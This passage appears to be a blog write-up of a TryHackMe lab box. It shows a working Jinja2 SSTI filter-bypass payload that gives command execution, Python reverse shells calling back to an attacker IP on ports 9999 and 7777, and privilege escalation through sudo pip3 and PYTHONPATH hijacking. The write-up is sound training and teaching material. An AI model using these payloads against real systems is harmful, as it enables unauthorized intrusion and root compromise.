+<p>There is a wierd endpoint in the webserver that stops the http server: <code class="language-plaintext highlighter-rouge">/shutdown</code>
+The 404 page will return the folder maybe some SSTI/XSS? We know that the server runs on python it may be jinja2, lets try sending <code class="language-plaintext highlighter-rouge">{{3 * 3}}</code>. if its jinja2 it should echo 9 back to the page. and ,that worked this will be our point of entry.</p>
+
+<h2 id="ssti--rce">SSTI / RCE</h2>
+
+<p>Now that we have <em>Server Side Template Injection (SSTI)</em>, we can try running code on the remote box!
+when we try running anything with an <code class="language-plaintext highlighter-rouge">_.[]</code> it will respond with</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>INVALID CHARACTERS DETECTED
+Your request has been blocked.
+</code></pre></div></div>
+<p>I think there are some filters in place, this may make it hard for us.
+First we are gonna try to get a urlparameter
+The following snippet will read the get parameter <code class="language-plaintext highlighter-rouge">c</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{request|attr('args')|attr('get')('c')}}?c= 
+</code></pre></div></div>
+
+<p>now that we can read c. 
+lets try running code on the machine.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'application'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span> <span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'us'</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="s">"globals"</span> <span class="o">+</span> <span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'us'</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="p">)</span> <span class="o">|</span><span class="n">attr</span><span class="p">(</span> <span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'us'</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="s">'getitem'</span> <span class="o">+</span> <span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'us'</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="p">)(</span> <span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'us'</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="s">'builtins'</span> <span class="o">+</span> <span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'us'</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">|</span><span class="n">attr</span><span class="p">(</span> <span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'us'</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="s">'getitem'</span> <span class="o">+</span> <span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'us'</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)(</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'us'</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="s">'import'</span> <span class="o">+</span> <span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'us'</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)(</span><span class="s">'os'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'popen'</span><span class="p">)(</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'c'</span><span class="p">))</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'read'</span><span class="p">)()}}</span><span class="err">?</span><span class="n">us</span><span class="o">=</span><span class="n">_</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span>
+</code></pre></div></div>
+
+<p>All of this is to get the <code class="language-plaintext highlighter-rouge">_</code> from the get parameter <code class="language-plaintext highlighter-rouge">us</code> and use it in the code, bcause underscores are blocked. 
+this is the code when you dont have the underscore blocker.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'application'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span> <span class="s">"__globals__"</span> <span class="p">)</span> <span class="o">|</span><span class="n">attr</span><span class="p">(</span> <span class="s">"__getitem__"</span> <span class="p">)(</span> <span class="s">"__builtins__"</span><span class="p">)</span> <span class="o">|</span><span class="n">attr</span><span class="p">(</span> <span class="s">"__getitem__"</span><span class="p">)(</span><span class="s">"__import__"</span><span class="p">)(</span><span class="s">'os'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'popen'</span><span class="p">)(</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'args'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'get'</span><span class="p">)(</span><span class="s">'c'</span><span class="p">))</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'read'</span><span class="p">)()}}</span><span class="err">?</span><span class="n">c</span><span class="o">=</span>
+</code></pre></div></div>
+
+<p>Way easier to read. :D</p>
+
+<h2 id="reverse-shell">Reverse Shell</h2>
+
+<p>Now that we can run code on the machine lets try running a reverseshell, we are going to use the following command. Lets use it inside the RCE exploit</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$YOUR_IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-c</span> <span class="s2">"SESSION=session-cookie"</span> http://<span class="nv">$IP</span>:8080/<span class="o">{{</span>request|attr<span class="o">(</span><span class="s1">'application'</span><span class="o">)</span>|attr<span class="o">(</span> request|attr<span class="o">(</span><span class="s1">'args'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'get'</span><span class="o">)(</span><span class="s1">'us'</span><span class="o">)</span><span class="k">*</span>2 + <span class="s2">"globals"</span> + request|attr<span class="o">(</span><span class="s1">'args'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'get'</span><span class="o">)(</span><span class="s1">'us'</span><span class="o">)</span><span class="k">*</span>2 <span class="o">)</span> |attr<span class="o">(</span> request|attr<span class="o">(</span><span class="s1">'args'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'get'</span><span class="o">)(</span><span class="s1">'us'</span><span class="o">)</span><span class="k">*</span>2 + <span class="s1">'getitem'</span> + request|attr<span class="o">(</span><span class="s1">'args'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'get'</span><span class="o">)(</span><span class="s1">'us'</span><span class="o">)</span><span class="k">*</span>2 <span class="o">)(</span> request|attr<span class="o">(</span><span class="s1">'args'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'get'</span><span class="o">)(</span><span class="s1">'us'</span><span class="o">)</span><span class="k">*</span>2 + <span class="s1">'builtins'</span> + request|attr<span class="o">(</span><span class="s1">'args'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'get'</span><span class="o">)(</span><span class="s1">'us'</span><span class="o">)</span><span class="k">*</span>2<span class="o">)</span> |attr<span class="o">(</span> request|attr<span class="o">(</span><span class="s1">'args'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'get'</span><span class="o">)(</span><span class="s1">'us'</span><span class="o">)</span><span class="k">*</span>2 + <span class="s1">'getitem'</span> + request|attr<span class="o">(</span><span class="s1">'args'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'get'</span><span class="o">)(</span><span class="s1">'us'</span><span class="o">)</span><span class="k">*</span>2<span class="o">)(</span>request|attr<span class="o">(</span><span class="s1">'args'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'get'</span><span class="o">)(</span><span class="s1">'us'</span><span class="o">)</span><span class="k">*</span>2 + <span class="s1">'import'</span> + request|attr<span class="o">(</span><span class="s1">'args'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'get'</span><span class="o">)(</span><span class="s1">'us'</span><span class="o">)</span><span class="k">*</span>2<span class="o">)(</span><span class="s1">'os'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'popen'</span><span class="o">)(</span>request|attr<span class="o">(</span><span class="s1">'args'</span><span class="o">)</span>|attr<span class="o">(</span><span class="s1">'get'</span><span class="o">)(</span><span class="s1">'c'</span><span class="o">))</span>|attr<span class="o">(</span><span class="s1">'read'</span><span class="o">)()}}</span>?us<span class="o">=</span>_&amp;c<span class="o">=</span>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$YOUR_IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<h2 id="changing-user">Changing user</h2>
+<p>Lets do some enumeration, in the following output we see we can run <code class="language-plaintext highlighter-rouge">/usr/bin/pip3 install</code> as the user <code class="language-plaintext highlighter-rouge">system-adm</code></p>
+<pre class="command-line" data-prompt="web@vulnnet-dotpy $">
+<code class="language-bash">sudo -l
+# User web may run the following commands on vulnnet-dotpy:
+#    (system-adm) NOPASSWD: /usr/bin/pip3 install *</code></pre>
+
+<p>Lets check <a href="https://gtfobins.github.io/">GTFOBins</a> for an exploit, and there is <a href="https://gtfobins.github.io/gtfobins/pip/#sudo">PIP Sudo GTFOBins</a>.</p>
+
+<pre class="command-line" data-prompt="web@vulnnet-dotpy $">
+<code class="language-bash">wget $YOUR_IP:8080/pip_setup.py; mv pip_setup.py setup.py
+sudo -u system-adm /usr/bin/pip3 install . </code></pre>
+
+<p>And we are now <strong>system-adm</strong> in our new shell. Lets get the user flag.</p>
+<pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $">
+<code class="language-bash">cat ~/user.txt
+# THM{********************************}</code></pre>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>lets do some enumeration on the new user.</p>
+
+<pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $" data-output="2-3-4-5-6">
+<code class="language-bash">sudo -l
+# Matching Defaults entries for system-adm on vulnnet-dotpy:
+#     env_reset, mail_badpass,
+#     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+# 
+# User system-adm may run the following commands on vulnnet-dotpy:
+#     (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py</code></pre>
+
+<p>we see that we can set an environment variable while executing python3. We can possibly do some <strong>PYTHONPATH hijacking</strong>. 
+there is a library imported <code class="language-plaintext highlighter-rouge">zipfile</code>, lets overwrite that! 
+lets make a file privesc.py on our machine, we can download that by running a small server on our machine and using wget.</p>
+
+<p>This code will open a socket connection to our machine on port 7777.</p>
+<pre data-src="privsec.py" data-download-link="" data-download-link-label="get_app"><code class="language-py">import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("$YOUR_IP",7777));os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"])</code>
+</pre>
+
+<p>Because <code class="language-plaintext highlighter-rouge">import zipfile</code> is run, it will execute the code inside of <code class="language-plaintext highlighter-rouge">zipfile.py</code> so we are going to rename the file on the remote and then add it to the <strong>$PYTHONPATH</strong> environment variable.</p>
+
+<pre class="command-line" data-prompt="system-adm@vulnnet-dotpy $">
+<code class="language-bash">wget $YOUR_IP:8080/privesc.py ; mv privesc.py zipfile.py
+sudo PYTHONPATH=/home/system-adm /usr/bin/python3 /opt/backup.py</code></pre>
+
+<p>and we have a new shell. lets check our user!</p>
+<pre class="command-line" data-prompt="root@vulnnet-dotpy $">
+<code class="language-bash">whoami; id
+#root
+#uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+<p>lets cat the root flag!</p>
+<pre class="command-line" data-prompt="root@vulnnet-dotpy $" data-output="2">
+<code class="language-bash">cat ~/root.txt
+THM{********************************}</code></pre>]]></content><author><name>daanbreur</name></author><category term="tryhackme" /><category term="web" /><category term="python" /><category term="jinja2" /><category term="pathhijacking" /><summary type="html"><![CDATA[Room Information]]></summary></entry></feed>
